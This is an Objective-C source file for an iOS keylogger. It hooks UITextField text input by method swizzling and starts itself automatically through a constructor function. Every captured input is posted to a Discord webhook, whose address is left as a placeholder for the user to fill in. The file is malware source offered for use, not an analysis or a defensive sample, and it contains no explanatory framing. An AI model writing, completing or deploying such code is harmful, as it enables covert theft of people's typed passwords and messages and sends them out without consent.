#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

@interface Keylogger : NSObject
+ (instancetype)sharedInstance;
- (void)startLogging;
- (void)sendToWebhook:(NSString *)data;
@end

@implementation Keylogger

static NSString *webhookURL = @"YOUR_DISCORD_WEBHOOK_URL";

+ (instancetype)sharedInstance {
    static Keylogger *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[Keylogger alloc] init];
    });
    return instance;
}

- (void)startLogging {
    // Method swizzling to intercept keyboard input
    Class textFieldClass = objc_getClass("UITextField");
    Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
    Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
    method_exchangeImplementations(originalMethod, swizzledMethod);
}

- (void)swizzled_insertText:(NSString *)text {
    // Log the input
    [self sendToWebhook:text];
    
    // Call original method
    [self swizzled_insertText:text];
}

- (void)sendToWebhook:(NSString *)data {
    NSURL *url = [NSURL URLWithString:webhookURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    NSDictionary *jsonDict = @{
        @"content": data,
        @"username": @"Keylogger"
    };
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:&error];
    
    if (!error) {
        [request setHTTPBody:jsonData];
        NSURLSession *session = [NSURLSession sharedSession];
        NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                NSLog(@"Error sending to webhook: %@", error.localizedDescription);
            }
        }];
        [task resume];
    }
}

@end

// Initialization function
__attribute__((constructor))
void initKeylogger() {
    [[Keylogger sharedInstance] startLogging];
}
